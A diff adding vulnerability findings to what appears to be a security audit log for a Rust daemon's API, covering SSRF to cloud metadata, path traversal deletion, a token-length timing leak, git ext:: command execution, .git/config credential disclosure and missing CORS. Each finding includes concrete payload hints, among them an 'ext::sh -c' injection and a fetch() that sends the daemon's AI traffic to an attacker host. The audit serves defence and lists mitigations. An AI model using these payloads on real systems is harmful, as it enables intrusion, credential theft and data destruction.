@@ -5,6 +5,11 @@ re-validated 2026-05-20 against renamed tree (nyx-agent-api -> nyctos-api,
   nyx-agent -> nyctos); line numbers re-anchored to HEAD; webhook HMAC
   path (webhook.rs) re-checked and remains mitigated; replay path
   (ensure_bundle_path_inside_root, verify_bundle_sha256) still mitigated.
+re-anchored 2026-05-20 (session-0013 deferred branch, HEAD 982529c):
+  events_ws now at router.rs:1694; auth_layer block at :100-120;
+  check_query_token at :142; pre-existing findings still apply
+  unchanged. Three new findings appended below (PATH_TRAVERSAL,
+  TIMING_SIDE_CHANNEL, SSRF via git transport). Total: 9 findings.
 
 ---
 record_exploration_finding
@@ -70,4 +75,62 @@ record_exploration_finding
   "endpoint": "POST {ai.api_base}/v1/messages (every AI call when ai.runtime = local-llm)",
   "rationale": "AnthropicSdkAdapter constructs the upstream URL with `format!(\"{}/v1/messages\", self.base_url.trim_end_matches('/'))` (anthropic.rs:230). `base_url` flows straight from `cfg.ai.api_base`, which the wizard sets verbatim from SetupRequest.local_llm_url after only `.trim()` (router.rs:312-317, :349-352). No scheme allowlist, no host allowlist, no rejection of loopback / link-local / RFC1918. So `local_llm_url = \"http://169.254.169.254/latest/meta-data/iam/security-credentials/role-name\"` causes every subsequent AI invocation to POST `http://169.254.169.254/latest/meta-data/iam/security-credentials/role-name/v1/messages` from the daemon process — confirming reachability of EC2 IMDS, GCE metadata, or any internal service the daemon can dial. Even when the upstream returns a non-JSON body the SSRF primitive (connect + observe latency / status code) is intact via the AiError::UpstreamRefused string surfaced back through the events bus. Chains with sentinel finding #2 (pre-setup AUTH_BYPASS) for an unauthenticated remote SSRF; stands on its own post-setup as an operator-misconfig / social-engineering vector. Static pass missed it because base_url crosses a configuration boundary (TOML / wizard JSON → adapter struct) the dataflow analyzer treats as a fresh source, not as taint.",
   "suggested_payload_hint": "POST /api/v1/setup body {\"ai_runtime\":\"local-llm\",\"local_llm_url\":\"http://169.254.169.254/latest/meta-data\",\"sandbox_backend\":\"auto\",\"i_own_this\":true}; trigger any /api/v1/runs that fans out to AI; observe AiEvent::Error carrying the IMDS body fragment."
+}
+
+---
+record_exploration_finding
+{
+  "path": "crates/nyctos-api/src/router.rs",
+  "line": 928,
+  "cap": "PATH_TRAVERSAL",
+  "endpoint": "DELETE /api/v1/projects/:project_id/repos/:name",
+  "rationale": "delete_project_repo computes target = s.state_repos_dir.join(&name) and immediately std::fs::remove_dir_all(&target) (router.rs:927-931). The repo name is operator-supplied via CreateRepoRequest::name and only validated for `trim().is_empty()` at :728 — no rejection of `..`, path separators, NUL bytes, or absolute paths. Path::join on Unix replaces the base when the second component is absolute, so name=`/etc/some-attacker-chosen-dir` resolves outside state_repos_dir; name=`..` walks one level up; name=`../../..` reaches the filesystem root region. The DB-side `repos.name` column has no path-shape constraint either (nyctos-core/store/repos.rs), so a hostile name persists through upsert and survives until DELETE. The route uses :name as a single path segment, but `%2e%2e` URL-decodes back to `..` and curl --path-as-is delivers it intact. Net: authenticated arbitrary-directory deletion under the daemon's UID, including the daemon's own state_dir / nyctos.toml on a second pass. Static pass missed because the source (POST handler) and sink (DELETE handler) are split across two functions with the DB row as the laundering step — taint flow doesn't reconnect across the persistence boundary.",
+  "suggested_payload_hint": "POST /api/v1/projects/proj-x/repos {\"name\":\"..\",\"source_kind\":\"local-path\",\"source_url_or_path\":\"/tmp\",\"i_own_this\":true} then DELETE /api/v1/projects/proj-x/repos/%2e%2e — observe state_repos_dir's parent vanish."
+}
+
+---
+record_exploration_finding
+{
+  "path": "crates/nyctos-api/src/router.rs",
+  "line": 156,
+  "cap": "TIMING_SIDE_CHANNEL",
+  "endpoint": "auth_layer (every /api/v1/* request)",
+  "rationale": "constant_eq returns early on a.len() != b.len() (router.rs:156-158) before the XOR loop runs, leaking the configured bearer token length to a remote attacker via 401-response latency. The byte loop below is constant-time, but the length oracle alone reduces brute-force from O(64^N) over all reasonable N to a single fixed N. Combined with the URL-query auth surface (router.rs:142) which leaks the live token to logs, this is one more confirmation channel for an offline cracker who has captured ciphertext or partial leakage. Use subtle::ConstantTimeEq, or pad provided and expected to a fixed buffer before XORing, so length itself is not observable. Static pass missed because the function is *named* constant_eq and the byte loop is correct — the bug is the structural early-return, not a missing operator.",
+  "suggested_payload_hint": "from a non-loopback origin, send Authorization: Bearer <N random hex chars> for N in 16..96; measure 401 response time distribution; the dip at the true N is the bearer length."
+}
+
+---
+record_exploration_finding
+{
+  "path": "crates/nyctos-api/src/router.rs",
+  "line": 1026,
+  "cap": "SSRF",
+  "endpoint": "POST /api/v1/projects/:project_id/repos/test",
+  "rationale": "test_repo_connectivity for source_kind in {git, github, gitlab} hands req.source_url_or_path straight to git_ls_remote_probe → `git -c credential.helper= ls-remote --exit-code <url>` (router.rs:1025-1042). No scheme allowlist, no host allowlist, no rejection of internal addresses. Two concrete primitives: (a) `ext::<command args>` — git's `ext` remote helper executes the command verbatim under the daemon UID (CVE-2017-1000117 family; still reachable today because the handler does not pass `-c protocol.ext.allow=never`), giving authenticated RCE; (b) `http://10.0.0.5/git/repo` or `http://169.254.169.254/latest/meta-data/` — git speaks HTTP and the daemon makes the request, surfacing pass/fail and stderr back to the caller, yielding authenticated SSRF + content-length oracle on internal services. The probe is gated by the bearer token (route is auth-layered), but chains with finding #2 (pre-setup AUTH_BYPASS — note: test_repo_connectivity is not on the setup-open path so this chain requires post-setup auth) and finding #6 (DNS rebind → cross-origin authed access). Static pass missed because git's transport plug-in surface isn't modeled by typical exec-sink analyzers — the dangerous behavior is one binary's argument, not a shell metacharacter.",
+  "suggested_payload_hint": "POST /api/v1/projects/proj-x/repos/test {\"source_kind\":\"git\",\"source_url_or_path\":\"ext::sh -c id>/tmp/pwn\"} — observe /tmp/pwn appear. Mitigate by passing `-c protocol.ext.allow=never -c protocol.allow=never` and a scheme/host allowlist before spawn."
+}
+
+---
+session-appended 2026-05-20 expl-demo follow-up (local-path .git/config disclosure + missing CORS layer; complements existing git transport / path-traversal / timing findings)
+
+---
+record_exploration_finding
+{
+  "path": "crates/nyctos-api/src/router.rs",
+  "line": 1088,
+  "cap": "INFO_DISCLOSURE",
+  "endpoint": "POST /api/v1/projects/:project_id/repos/test (source_kind in {local-path,local})",
+  "rationale": "read_local_git_remote(path) accepts an operator-supplied filesystem path, reads `<path>/.git/config`, and returns the `[remote \"origin\"] url =` value verbatim in TestRepoResponse.on_disk_git_remote (router.rs:1008-1016, parser at :1088-1117). No root-confinement, no canonicalisation, symlinks honoured. Two primitives: (a) filesystem oracle — the three response-message variants (`path does not exist` / `is not a directory` / `path readable; no .git/config remote on disk`) discriminate file existence and directory type across the daemon's entire read-permission surface, giving an authenticated attacker a fast probe over the host filesystem; (b) credential exfiltration — any readable `.git/config` whose origin embeds basic-auth (`https://user:token@host/repo.git`) is echoed back to the caller. Note: `require_project` runs first so this needs a valid project_id, but `POST /api/v1/projects` is open to any bearer-holder and accepts arbitrary names, so the project gate is one hop, not a real barrier. Distinct from the existing PATH_TRAVERSAL finding (DELETE repo) and from the git_ls_remote SSRF finding (different code path, different sink).",
+  "suggested_payload_hint": "POST /api/v1/projects/proj-x/repos/test {\"source_kind\":\"local-path\",\"source_url_or_path\":\"/home/victim/proj-with-creds\"} — response.on_disk_git_remote leaks any embedded token; iterate paths to map the filesystem via the three distinct error strings."
+}
+
+---
+record_exploration_finding
+{
+  "path": "crates/nyctos-api/src/router.rs",
+  "line": 48,
+  "cap": "CORS_MISCONFIG",
+  "endpoint": "all /api/v1/* (no CorsLayer attached)",
+  "rationale": "build_router stacks only TraceLayer and the bearer auth_layer (router.rs:89-91). No tower_http::cors::CorsLayer anywhere in the crate (grep `Cors` returns zero matches across nyctos-api). Browser SOP still blocks cross-origin JSON `fetch()` reads, but two real gaps remain: (1) simple-request writes — `POST` with `Content-Type: text/plain` (or `application/x-www-form-urlencoded`) skip the preflight entirely; axum's Json extractor reads the body regardless of Content-Type so a CSRF-style cross-origin POST to /api/v1/setup or /api/v1/projects lands; (2) chains with the `?token=` URL-query auth (router.rs:142) and the constant_eq length oracle (existing finding) — once a bearer leaks via any channel, a malicious page can use it cross-origin to mutate state because there is no Origin / SameSite gate. Mitigation: attach a deny-by-default CorsLayer with allow_origin pinned to the operator's UI origin, require `Content-Type: application/json` at the extractor, and refuse `?token=` for any non-GET method (or drop the query-token path entirely). Static pass missed because the bug is structural (a missing layer) not a tainted-flow sink.",
+  "suggested_payload_hint": "host attacker.tld with: fetch('http://127.0.0.1:8088/api/v1/setup?token='+leaked,{method:'POST',mode:'no-cors',headers:{'Content-Type':'text/plain'},body:'{\\\"ai_runtime\\\":\\\"local-llm\\\",\\\"local_llm_url\\\":\\\"http://attacker/api\\\",\\\"sandbox_backend\\\":\\\"process\\\",\\\"i_own_this\\\":true}'}); — operator visits the page, hostile nyctos.toml lands."
 }
